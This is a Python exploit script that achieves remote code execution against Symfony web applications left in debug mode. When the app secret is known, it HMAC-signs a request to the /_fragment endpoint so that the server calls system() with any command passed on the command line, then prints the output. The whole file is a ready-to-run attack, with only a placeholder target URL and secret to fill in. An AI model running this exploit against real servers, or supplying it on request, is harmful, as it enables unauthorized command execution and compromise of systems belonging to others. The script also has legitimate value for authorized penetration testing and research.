#!/usr/bin/env python3

"""
author: otter ʕ •ᴥ•ʔ

based on https://portswigger.net/daily-swig/symfony-based-websites-open-to-rce-attack-research-finds

This script allows to get remote code execution on a web application using Symfony in debug mode;
using the app's secret we can use the `/_fragment` endpoint to call the `system()` function allowing
execution of arbitrary commands.
"""

import hashlib
import hmac
from base64 import b64encode
from urllib import parse
import requests
from html2text import html2text
import sys


# set up headers for POST requests
HEADER = {
    "Content-Type": "application/x-www-form-urlencoded",
}

# url and secret parameters
URL = "http://website.com"
SECRET = b"SOMESECRET"


# builds the job dictionary to call the `system` function with
# the specified command and sends the request
def get(param):
    job = {
        "_controller": "system",
        "command": param,
        "return_value": "null",
    }
    out = parse.quote(parse.urlencode(job))
    url = f"{URL}/_fragment?_path={out}"

    # calculates the HMAC-SHA256 hash using the secret key
    hash = b64encode(hmac.HMAC(SECRET, url.encode(),
                               hashlib.sha256).digest()).decode()
    url += f"&_hash={hash}"
    print(url)
    return requests.get(url)


# execute commands specified in the first cli argument
# and print the output to the terminal
def main():
    command = sys.argv[1]
    req = get(command)
    print(req.status_code)
    print(html2text(req.text))


if __name__ == "__main__":
    main()
